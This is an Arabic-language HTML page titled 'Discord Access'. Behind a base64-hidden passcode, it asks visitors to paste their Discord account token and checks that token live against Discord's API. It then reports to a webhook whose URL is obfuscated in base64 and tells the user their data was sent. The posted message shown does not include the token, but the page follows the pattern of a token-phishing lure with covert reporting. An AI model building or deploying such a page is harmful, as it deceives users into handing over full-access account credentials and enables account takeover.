<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Discord Access</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #fff;
      display: flex;
      height: 100vh;
      justify-content: center;
      align-items: center;
      margin: 0;
    }
    .container {
      text-align: center;
    }
    input[type="text"] {
      padding: 10px;
      width: 300px;
      font-size: 1rem;
      margin-top: 10px;
      margin-bottom: 20px;
    }
    button {
      background-color: black;
      color: white;
      border: none;
      padding: 12px 24px;
      font-size: 1rem;
      cursor: pointer;
    }
    button:hover {
      background-color: #222;
    }
    #tokenScreen {
      display: none;
    }
  </style>
</head>
<body>
  <div class="container" id="passwordScreen">
    <h2>أدخل الرمز السري:</h2>
    <input id="passwordInput" type="text" placeholder="رمز الدخول" />
    <br />
    <button id="checkPasswordBtn">دخول</button>
  </div>

  <div class="container" id="tokenScreen">
    <h2>أدخل توكن حسابك:</h2>
    <input id="tokenInput" type="text" placeholder="توكن الحساب" />
    <br />
    <button id="checkTokenBtn">التالي</button>
  </div>

  <script>
    const encPass = "QWhtZWQ=";
    const encWebhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM3ODAzNjczODc1MTk4Nzg5NC8xM0hETkNXX2pGWk10MU9qR2JxZDhWV0ZWZzlNcFhCS1VuZDBNSlJ1OHVRNERYbmdmTU5NdXR4MWRqQTEyRTk3UXgzZg==";

    const passwordInput = document.getElementById("passwordInput");
    const tokenInput = document.getElementById("tokenInput");
    const passwordScreen = document.getElementById("passwordScreen");
    const tokenScreen = document.getElementById("tokenScreen");
    const checkPasswordBtn = document.getElementById("checkPasswordBtn");
    const checkTokenBtn = document.getElementById("checkTokenBtn");

    function b64d(s) {
      return atob(s);
    }

    checkPasswordBtn.addEventListener("click", () => {
      if (b64d(encPass) === passwordInput.value.trim()) {
        passwordScreen.style.display = "none";
        tokenScreen.style.display = "block";
      } else {
        alert("رمز خاطئ!");
      }
    });

    checkTokenBtn.addEventListener("click", () => {
      const token = tokenInput.value.trim();
      if (!token) {
        alert("أدخل التوكن");
        return;
      }
      fetch("https://discord.com/api/v9/users/@me", {
        headers: { Authorization: token }
      }).then(res => {
        if (res.ok) {
          sendWebhook();
          alert("تم التحقق من التوكن وإرسال البيانات.");
        } else {
          alert("توكن غير صالح");
        }
      }).catch(() => alert("خطأ في الاتصال"));
    });

    function sendWebhook() {
      fetch(b64d(encWebhook), {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: "✅ تم الدخول والتحقق من التوكن بنجاح." })
      });
    }
  </script>
